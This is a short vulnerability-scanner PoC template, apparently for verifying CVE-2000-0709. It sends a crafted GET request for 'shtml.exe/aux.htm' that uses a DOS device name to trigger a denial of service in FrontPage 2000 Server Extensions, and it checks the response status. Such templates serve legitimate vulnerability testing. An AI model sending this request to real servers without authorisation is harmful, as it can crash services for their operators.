[info]
author = "ave"
description = "通过向目标服务器发送包含 DOS 设备名（如 AUX）的特制 URL 请求，验证 Microsoft FrontPage 2000 Server Extensions 1.1 的 shtml.exe 组件是否存在拒绝服务漏洞。"
id = "POC-AVE-2000-0865"
name = "Microsoft FrontPage 2000 Server Extensions 1.1 shtml.exe 拒绝服务漏洞 PoC"
severity = "medium"
tags = ["ave-2000-0865"]
vuln_id = [
    "CVE-2000-0709",
    "AVE-2000-0865",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/_vti_bin/shtml.exe/aux.htm"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [
    200,
    500,
]
type = "status"
